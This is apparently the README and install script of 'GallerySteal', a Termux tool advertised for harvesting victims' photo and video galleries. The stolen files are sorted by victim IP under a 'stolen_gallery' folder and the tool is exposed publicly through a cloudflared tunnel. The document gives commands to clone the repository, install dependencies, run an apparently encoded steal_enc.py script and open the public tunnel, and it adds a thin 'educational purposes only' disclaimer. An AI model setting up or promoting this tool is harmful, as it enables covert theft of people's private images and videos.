# GallerySteal
Features:

✅ Auto Gallery Scanner
✅ Full Folder Structure Preservation
✅ Parallel File Upload
✅ Real-time Progress Tracking
✅ IP-based Organization
✅ Cloudflare Ready
✅ Multi-Format Support (Images/Videos)

📥 Installation:

pkg update && pkg upgrade -y
pkg install python git -y
pip install requests
git clone https://github.com/DM-Profesor/GallerySteal.git
cd steal
python3 steal_enc.py


🌐 Public URL (with Cloudflare):

bash
cloudflared tunnel --url http://localhost:8000

📂 Stolen Data Location:

stolen_gallery/[victim_ip]/[folder_structure]/`

⚠️ Disclaimer:

This tool is created for EDUCATIONAL PURPOSES ONLY.
Don't use it for illegal activities. Always take permission before testing.

📞 Contact:

👤 Author: @Spider-imran
📱 Instagram: [soon]
🔗 Channel: @Termuxsecurity

#!/bin/bash
echo "[✓] Updating Termux..."
pkg update -y && pkg upgrade -y

echo "[✓] Installing Python..."
pkg install python -y

echo "[✓] Installing Git..."
pkg install git -y

echo "[✓] Installing Cloudflared..."
pkg install cloudflared -y

echo "[✓] Installing Python packages..."
pip install requests

echo "[✓] Making script executable..."
chmod +x gallery_steal.py

echo ""
echo "✅ Installation Complete!"
echo "▶️  Run: python gallery_steal.py"
echo "▶️  Then: cloudflared tunnel --url http://localhost:8000"
